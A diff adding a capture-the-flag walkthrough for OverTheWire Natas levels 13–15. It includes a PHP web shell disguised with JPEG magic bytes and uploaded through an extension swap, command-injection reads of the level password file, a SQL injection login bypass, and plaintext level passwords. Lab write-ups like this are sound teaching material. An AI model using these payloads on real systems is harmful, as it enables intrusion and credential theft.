@@ -832,8 +832,190 @@ This code is similar to that of previous level, the difference is that only imag
 
 We can still find our way around it, right?? That's why we are h4x0rs hehe😎
 
+Doing some research I found this [page](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454). 
+
+We can use something as simple as this ```AAAA<?php system($_GET['cmd']); ?>``` to bypass restrictions. Save this in a ```.php``` file
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
+└─$ gedit bankai.php
+                                                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
+└─$ cat bankai.php
+AAAA<?php system($_GET['cmd']); ?>
+                                                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
+└─$ file bankai.php
+bankai.php: ASCII text
+```
+Now, we'll be using a tool called ```hexeditor``` to change the header of ```bankai.php``` to that of a ```.jpeg``` header.
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fca6e19a-dc00-46c1-b12a-6b64962595fb)
+
+From the above screenshot, you can see that the ```AAAA``` has the header ```41 41 41 41```, we'll be changing the header to that of a ```.jpeg file```. Checking it up online I got this ```FF D8 FF EE```. So, let’s change the header to that
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b60d0cdc-7124-4dc2-bd3e-1241e7e47fe6)
+
+Now that we have changed the header, lets save it and exit (hit ctrl +x, then hit the enter button to exit).
+
+Lets check the file type again
+
+command:```file bankai.php```
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
+└─$ hexeditor bankai.php
+                                                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
+└─$ file bankai.php 
+bankai.php: JPEG image data
+```
+Cool, we were able to change the headers. This means we can go ahead to upload this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0d994047-11ab-47e4-b5e5-cb1074aebebf)
+
+Just as we did in the previous level, we'll be using burpsuite to modify the file extension from ```.jpg``` to ```.php```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d2c4875c-a9db-49ba-88d7-f0f06feb3412)
+
+Forward the request,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/745fdc2e-ffa6-4c4e-b5f3-e82e3b046c3f)
+
+Nice, now lets view our payload
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/666e4d53-9595-450c-b4ec-4b85fd542ed5)
+
+Nice, we can get command injection through this by adding ```?cmd=id``` to the back of the url
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4a8ed081-9715-441a-9ef4-ea9b900215bc)
+
+Now, lets get the password to the next level, this can be found at ```/etc/natas_webpass/natas14```. To read the password add ```?cmd=cat /etc/natas_webpass/natas14``` at the back of the url
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/90579867-a071-4912-8920-3d04f5bdc14d)
+
+Cool, we got the password to the next level
 
 
+
+# Level 14
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d5ac3d05-2096-4d2a-aab9-d7ebbb7bfabb)
+
+Navigating to the webpage and using the password we got from the previous level
+
+username:```natas14```       password:```qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/230b7db8-f55b-4cee-9398-64b4260c2da8)
+
+Checking the source code, we find this php script
+
+```php
+<?php
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas14', '<censored>');
+    mysqli_select_db($link, 'natas14');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+    mysqli_close($link);
+} else {
+?>
+```
+Explaining the code
+```
+1. The script checks if the "username" key exists in the user input.
+2. It establishes a connection to a MySQL database.
+3. A SQL query is constructed using user-supplied "username" and "password" values without proper sanitization.
+4. If the "debug" key is present, the executed query is displayed (a potential security risk).
+5. The query is executed, and if it returns any rows, a successful login message is echoed.
+6. If the login fails (no rows returned), an "Access denied" message is displayed.
+7. The database connection is closed.
+```
+ From the source code we get the sql query to be this
+
+ ```
+SELECT * from users where username="<username>" and password="<password>"
+```
+You’ll notice that the user input is not being filtered, which means we can use escape characters to make the query act differently than it should be
+
+To bypass the login page
+
+username:```" '1'='1'#```    password:```aaa```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7bbb4b62-c2df-4683-99d6-8536058dd0c9)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/13202054-1539-4e02-956d-437c3fe06c0b)
+
+Cool, we got the password for  the next level
+
+
+
+# Level 15
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c8a4bdaa-70ad-4c63-bed4-5f016b223a68)
+
+Navigate to the webpage and use the password we got from the previous level
+
+username:```natas15```        password:```TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fa5c82e5-2c1d-4def-8965-18e9e1232605)
+
+Checking the source code
+
+```php
+<?php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas15', '<censored>');
+    mysqli_select_db($link, 'natas15');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+} else {
+?>
+```
+Explaining the code
+```
+1. The script checks if the provided "username" exists in the "users" table.
+2. It establishes a connection to a MySQL database using credentials.
+3. A SQL query is constructed to select rows from the "users" table based on the "username" column.
+4. If the "debug" key is present, the executed query is displayed (for debugging purposes).
+5. The query is executed, and if there are rows returned, it indicates that the user exists.
+6. If no rows are returned, it indicates that the user doesn't exist.
+7. If an error occurs during the query execution, an error message is displayed.
+8. The database connection is closed
+```
+The sql query from then source code is ```SELECT * FROM users WHERE username="<username>"```
 
 
 
